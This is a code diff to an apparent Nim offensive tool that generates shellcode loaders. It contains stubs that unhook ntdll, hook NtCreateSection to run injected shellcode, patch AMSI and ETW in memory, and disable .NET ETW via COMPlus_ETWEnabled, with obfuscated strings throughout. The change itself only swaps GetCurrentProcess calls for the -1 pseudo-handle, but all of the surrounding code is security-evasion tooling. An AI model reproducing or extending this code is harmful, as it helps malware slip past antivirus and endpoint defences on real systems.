@@ -7,10 +7,7 @@ let UnhookNtdllStub * = """
 
     proc ntdllunhook(): bool =
         let low: uint16 = 0
-        when defined(DInvoke):
-            var processH = MyGetCurrentProcess()
-        else:
-            var processH = GetCurrentProcess()
+        var processH = -1
         when defined(DInvoke):
             var ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
         else:
@@ -169,12 +166,7 @@ proc decryptLate2(): void =
 
 proc NtCreateSectionHookShellcode[byte](friendlycode: openarray[byte]): void =
 
-    when defined(DInvoke):
-        let tProcess = MyGetCurrentProcessId()
-        var pHandle: HANDLE = MyGetCurrentProcess()
-    else:
-        let tProcess = GetCurrentProcessId()
-        var pHandle: HANDLE = GetCurrentProcess()
+    var pHandle: HANDLE = -1 # Current Process Handle
         
     var 
         status          : NTSTATUS          = 0x00000000
@@ -377,7 +369,7 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
                 echo obf("Restored old function values!")
         when defined(verbose):
             echo obf("Calling real NtCreateSection\r\n")
-        var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, 16)
+        var status = NtFlushInstructionCache(-1, addressToHook, 16)
         if (status == 0):
             when defined(verbose):
                 echo obf("NtFlushInstructionCache success")
@@ -495,7 +487,7 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
             else:
                 echo obf("Buffers == nil")
         
-        var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize)
+        var status = NtFlushInstructionCache(-1, addressToHook, dwSize)
         if (status == 0):
             when defined(verbose):
                 echo obf("NtFlushInstructionCache success")
@@ -618,10 +610,7 @@ proc ProviderPatchAmsi(): void =
       var success: BOOL
       var protectAddress = cs
       var friendlycodeLength = cast[SIZE_T](patch.len)
-      when defined(DInvoke):
-        var pHandle: HANDLE = MyGetCurrentProcess()
-      else:
-        var pHandle: HANDLE = GetCurrentProcess()
+      var pHandle: HANDLE = -1
       var 
         status          : NTSTATUS          = 0x00000000
         buffer          : LPVOID
@@ -776,10 +765,7 @@ let AMSIStub * = """
         var protectAddress = cs
         var friendlycodeLength = cast[SIZE_T](patch.len)
 
-        when defined(DInvoke):
-            var pHandle: HANDLE = MyGetCurrentProcess()
-        else:
-            var pHandle: HANDLE = GetCurrentProcess()
+        var pHandle: HANDLE = -1
         var 
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
@@ -938,10 +924,7 @@ let ETWPatchStub * = """
         var protectAddress = cs
         var friendlycodeLength = cast[SIZE_T](patch.len)
 
-        when defined(DInvoke):
-            var pHandle: HANDLE = MyGetCurrentProcess()
-        else:
-            var pHandle: HANDLE = GetCurrentProcess()
+        var pHandle: HANDLE = -1
         var 
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
@@ -1342,6 +1325,7 @@ when isMainModule:
 
 let ETWCOMVARStub * = """
 
+    # ToDO: Change via Syscall -> ntdll.dll RtlSetEnvironmentVariable
     proc BlockETW(): bool =
         # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
         var cometw: string = obf("COMPlus_ETWEnabled")
